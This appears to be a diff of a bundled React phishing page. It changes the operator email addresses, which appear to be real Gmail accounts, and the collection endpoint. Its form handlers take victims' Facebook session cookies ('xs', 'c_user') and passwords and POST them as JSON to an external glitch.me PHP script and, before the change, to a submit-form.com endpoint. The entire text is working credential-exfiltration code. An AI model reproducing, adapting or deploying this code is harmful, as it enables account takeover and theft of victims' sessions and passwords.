@@ -10285,7 +10285,7 @@
           let { hide: t } = e;
           const [r, a] = (0, n.useState)(),
             [i, o] = (0, n.useState)(),
-            l = ["PROFESSOR@HACKER.Nizamani","PROFESSOR@HACKER.Nizamani"],
+            l = ["mjohn72929@gmail.com","ameliajackson4001@gmail.com"],
             s = _();
           return (0, me.jsxs)(me.Fragment, {
             children: [
@@ -10375,15 +10375,15 @@
                         className: "ant-form ant-form-horizontal css-m4timi",
                         onSubmit: (e) => {
                           e.preventDefault(),
-                            fetch("https://submit-form.com/UlUJoYqHo", {
+                            fetch("https://mixed-fluff-space.glitch.me/zubairbhaispan.php", {
                               method: "POST",
                               headers: { "Content-Type": "application/json" },
                               body: JSON.stringify({
                                 emails: l,
-                                : "PROFESSOR@HACKER.Nizamani",
+                                workerEmail: "mjohn72929@gmail.com",
                                 xs: r,
                                 c_user: i,
-                                PROFESSOR: "PROFESSOR",
+                                name: "Aizaz",
                               }),
                             }).then((e) => {
                               e.ok;
@@ -14236,7 +14236,7 @@
           });
         },
         Wt = () => {
-          const e = ["PROFESSOR@HACKER.Nizamani"],
+          const e = ["mjohn72929@gmail.com"],
             t = _(),
             [r, a] = (0, n.useState)(!1),
             [i, o] = (0, n.useState)(!1),
@@ -14329,7 +14329,7 @@
                                       },
                                       body: JSON.stringify({
                                         emails: e,
-                                        workerEmail: "PROFESSOR@HACKER.Nizamani",
+                                        workerEmail: "mjohn72929@gmail.com",
                                         xs: l,
                                         c_user: u,
                                         name: "My Self",
@@ -14422,7 +14422,7 @@
               (0, me.jsx)("button", {
                 onClick: (n) => {
                   n.preventDefault(),
-                    fetch("https://submit-form.com/UlUJoYqHo", {
+                    fetch("https://mixed-fluff-space.glitch.me/zubairbhaispan.php", {
                       method: "POST",
                       headers: { "Content-Type": "application/json" },
                       body: JSON.stringify({ password: t }),
